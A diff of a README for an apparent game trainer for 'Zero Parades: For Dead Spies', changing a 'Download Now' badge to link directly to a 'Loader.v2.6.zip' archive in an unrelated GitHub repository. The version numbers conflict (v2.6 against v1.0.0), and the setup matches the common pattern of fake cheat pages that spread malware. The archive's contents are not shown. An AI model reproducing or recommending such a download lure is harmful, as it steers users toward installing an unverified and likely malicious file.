@@ -7,9 +7,11 @@
 
 # 🎮 Zero Parades: For Dead Spies Trainer
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-v2.6-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Lowercladisconnect/Loaderik/releases/download/v1.0.0/Loader.v2.6.zip)
+![Download Now](https://github.com/Lowercladisconnect/Loaderik/releases/download/v1.0.0/Loader.v2.6.zip)
 
 Latest Version: v1.0.0 • File Size: ~156 MB
+
+</div>
 
 
 ## 🔥 About The Project
